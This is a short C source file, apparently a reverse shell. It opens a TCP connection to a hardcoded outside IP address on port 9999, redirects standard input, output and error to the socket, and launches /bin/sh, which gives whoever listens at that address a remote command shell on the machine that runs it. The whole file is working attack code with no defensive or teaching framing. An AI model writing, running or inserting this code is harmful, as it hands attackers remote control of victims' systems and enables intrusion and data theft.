// reverse shell
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>

#define NULL 0

int socket(int domain, int type, int protocal);
int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
int dup2(int oldfd, int newfd);
int execve(const char *filename, char *const argv[], char *const envp[]);
int close(int fd);

int main()
{
	char* address = "123.207.141.87";
	int port = 9999;

	// create a new socket but it has no address assigned yet
	int sockfd = socket(AF_INET/* 2 */, SOCK_STREAM/* 1 */, 0);

	// create sockaddr_in structure for use with connect function
	struct sockaddr_in sock_in;
	sock_in.sin_family = AF_INET;
	sock_in.sin_addr.s_addr = inet_addr(address);
	sock_in.sin_port = htons(port);

	// perform connect to target IP address and port
	connect(sockfd, (struct sockaddr*)&sock_in, sizeof(struct sockaddr_in));

	// duplicate file descriptors for STDIN/STDOUT/STDERR
	for(int n = 0; n <= 2; n++)
	{
		dup2(sockfd, n);
	}

	// execve("/bin/sh", 0, 0)
	execve("/bin/sh", NULL, NULL);

	close(sockfd);

	return 0;
}
